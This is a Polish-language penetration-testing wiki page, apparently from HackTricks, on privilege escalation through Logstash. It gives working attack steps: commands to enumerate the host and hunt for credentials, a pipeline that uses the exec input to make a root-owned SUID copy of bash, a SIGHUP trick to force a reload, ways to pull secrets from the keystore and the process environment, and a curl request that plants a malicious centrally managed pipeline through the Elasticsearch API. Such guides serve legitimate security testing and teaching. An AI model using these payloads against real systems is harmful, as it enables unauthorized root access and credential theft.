# Eskalacja uprawnień Logstash

## Logstash

Logstash służy do **gather, transform, and dispatch logs** za pośrednictwem systemu znanego jako **pipelines**. Te pipelines składają się z etapów **input**, **filter** i **output**.<sup>[[4]](#references)</sup> Interesujący aspekt pojawia się, gdy Logstash działa na przejętej maszynie.

### Konfiguracja Pipeline

W przypadku instalacji pakietów Debian i RPM pipelines są konfigurowane za pośrednictwem **/etc/logstash/pipelines.yml**, który zawiera lokalizacje konfiguracji pipelines; inne dystrybucje umieszczają `pipelines.yml` w katalogu Logstash `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ten plik ujawnia lokalizację plików **.conf** zawierających konfiguracje pipeline. W przypadku używania **Elasticsearch output** sprawdź ustawienia `user`/`password`, `cloud_auth` lub `api_key`; efektywne uprawnienia konta zależą od Elasticsearch. Glob `path.config` ładuje każdy pasujący plik dla danego pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Jeśli Logstash zostanie uruchomiony z `-f <directory>` zamiast `pipelines.yml`, `-f` ma pierwszeństwo, a **wszystkie pliki w tym katalogu są łączone w kolejności leksykograficznej i analizowane jako jedna konfiguracja**.<sup>[[6]](#references)[[7]](#references)</sup> Tworzy to 2 ofensywne konsekwencje:

- Umieszczony plik, taki jak `000-input.conf` lub `zzz-output.conf`, może zmienić sposób składania finalnego pipeline
- Niepoprawny plik może spowodować niepowodzenie walidacji połączonej konfiguracji; podczas reload Logstash zachowuje poprzedni pipeline, dlatego przed poleganiem na auto-reload należy walidować payloady.<sup>[[1]](#references)</sup>

### Szybka enumeracja na przejętym hoście

Na hoście, na którym zainstalowano Logstash, szybko sprawdź:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Sprawdź również, czy lokalne API monitorowania jest dostępne. Domyślnie nasłuchuje na **127.0.0.1:9600**, co zwykle wystarcza po uzyskaniu dostępu do hosta.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Te endpointy ujawniają identyfikatory i ustawienia pipeline’ów, metryki czasu wykonywania oraz liczniki pomyślnego/nieudanego przeładowania konfiguracji, pomagając potwierdzić, czy zmiana została zaakceptowana.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Jeśli odzyskane poświadczenie dotyczy **Elasticsearch**, sprawdź [tę inną stronę o Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Aby spróbować przeprowadzić privilege escalation, najpierw ustal użytkownika, z uprawnieniami którego faktycznie działa usługa Logstash; nie zakładaj, że jest to root lub użytkownik **logstash**. Musisz spełniać **jedno** z poniższych kryteriów:

- Posiadasz **uprawnienia zapisu** do pliku pipeline’u **.conf** **lub**
- Plik **/etc/logstash/pipelines.yml** używa wildcardu, a Ty możesz zapisywać w docelowym folderze.<sup>[[6]](#references)[[7]](#references)</sup>

Dodatkowo musi być spełniony **jeden** z poniższych warunków:

- Możesz zrestartować usługę Logstash **lub**
- W pliku **/etc/logstash/logstash.yml** ustawiono **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Jeśli w konfiguracji znajduje się wildcard, utworzenie pliku pasującego do tego wildcardu umożliwia wykonanie poleceń.<sup>[[7]](#references)[[9]](#references)</sup> Na przykład:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Tutaj **interval** określa częstotliwość wykonywania w sekundach. W podanym przykładzie polecenie **whoami** jest uruchamiane co 120 sekund, a jego dane wyjściowe są kierowane do **/tmp/output.log**.<sup>[[9]](#references)</sup>

Przy ustawieniu **config.reload.automatic: true** w **/etc/logstash/logstash.yml** Logstash automatycznie wykryje i zastosuje nowe lub zmodyfikowane konfiguracje pipeline bez konieczności ponownego uruchamiania.<sup>[[1]](#references)[[15]](#references)</sup> Jeśli nie ma wildcard, nadal można modyfikować istniejące konfiguracje, ale należy zachować ostrożność, aby uniknąć zakłóceń.

### Bardziej niezawodne payloady pipeline

Plugin wejściowy `exec` nadal działa w aktualnych wydaniach i wymaga albo `interval`, albo `schedule`. Wykonuje on działanie poprzez **forking** JVM Logstash, więc jeśli ilość pamięci jest ograniczona, payload może zakończyć się błędem `ENOMEM` zamiast uruchomić się po cichu.<sup>[[9]](#references)</sup>

Gdy usługa ma wystarczające uprawnienia do utworzenia pliku SUID należącego do roota, praktyczny payload do privilege escalation to taki, który pozostawia trwały artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Jeśli nie masz uprawnień do restartowania, ale możesz wysyłać sygnały do procesu, Logstash obsługuje również przeładowanie wyzwalane przez **SIGHUP** w systemach uniksopodobnych:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Pamiętaj, że nie każdy plugin obsługuje ponowne ładowanie. Na przykład wejście **stdin** uniemożliwia automatyczne ponowne ładowanie, więc nie zakładaj, że `config.reload.automatic` zawsze uwzględni wprowadzone zmiany.<sup>[[1]](#references)</sup>

### Kradzież sekretów z Logstash

Zanim skupisz się wyłącznie na code execution, zbierz dane, do których Logstash ma już dostęp:

- Dane uwierzytelniające mogą występować w wyjściach `elasticsearch {}`, adresach URL/ustawieniach `http_poller`, wejściach JDBC lub ustawieniach związanych z cloud; te pluginy udostępniają pola z danymi uwierzytelniającymi, które warto przeszukać.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings mogą znajdować się w **`/etc/logstash/logstash.keystore`** lub w innym katalogu `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Hasło keystore może być przekazywane przez **`LOGSTASH_KEYSTORE_PASS`**, a instalacje RPM/DEB pobierają zmienne środowiskowe usługi z **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Rozwijanie zmiennych środowiskowych za pomocą `${VAR}` jest wykonywane podczas uruchamiania Logstash, dlatego warto sprawdzić środowisko usługi.<sup>[[14]](#references)</sup>

Przydatne kontrole:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Warto to również sprawdzić, ponieważ **CVE-2023-46672** wykazało, że w określonych okolicznościach Logstash zapisywał w logach poufne informacje, w tym sekrety przechowywane w jego keystore i przywoływane w konfiguracji; przejrzyj stare logi Logstash oraz wpisy `journald`, jeśli te okoliczności mogą mieć zastosowanie.<sup>[[3]](#references)</sup>

### Nadużycie scentralizowanego zarządzania pipeline'ami

W niektórych środowiskach host **w ogóle nie korzysta** z lokalnych plików `.conf`. Jeśli skonfigurowano **`xpack.management.enabled: true`**, Logstash może pobierać centralnie zarządzane pipeline'y z Elasticsearch/Kibana, a po włączeniu tego trybu lokalne konfiguracje pipeline'ów przestają być źródłem prawdy.<sup>[[2]](#references)</sup>

Oznacza to inną ścieżkę ataku:

1. Odzyskaj dane uwierzytelniające Elastic z lokalnych ustawień Logstash, keystore lub logów.<sup>[[3]](#references)[[10]](#references)</sup>
2. Sprawdź, czy konto ma uprawnienie klastra **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Utwórz lub zastąp centralnie zarządzany pipeline, aby host Logstash wykonał Twój payload podczas następnego interwału odpytywania.<sup>[[2]](#references)[[16]](#references)</sup>

API Elasticsearch używane przez tę funkcję to:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Jest to szczególnie przydatne, gdy pliki lokalne są tylko do odczytu, ale Logstash jest już zarejestrowany do zdalnego pobierania pipeline'ów.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Ponowne ładowanie pliku konfiguracyjnego](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Konfigurowanie scentralizowanego zarządzania pipeline'ami](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Aktualizacja zabezpieczeń Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Tworzenie pipeline'u Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Układ katalogów Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Wiele pipeline'ów](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Uruchamianie Logstash z wiersza poleceń](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitorowanie Logstash za pomocą API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Wtyczka wejściowa Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Magazyn kluczy sekretów dla bezpiecznych ustawień](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Wtyczka wyjściowa Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Wtyczka wejściowa Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Wtyczka wejściowa Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Używanie zmiennych środowiskowych](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Tworzenie lub aktualizowanie pipeline'u Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Pobieranie ustawień pipeline'ów](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Pobieranie statystyk pipeline'ów](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
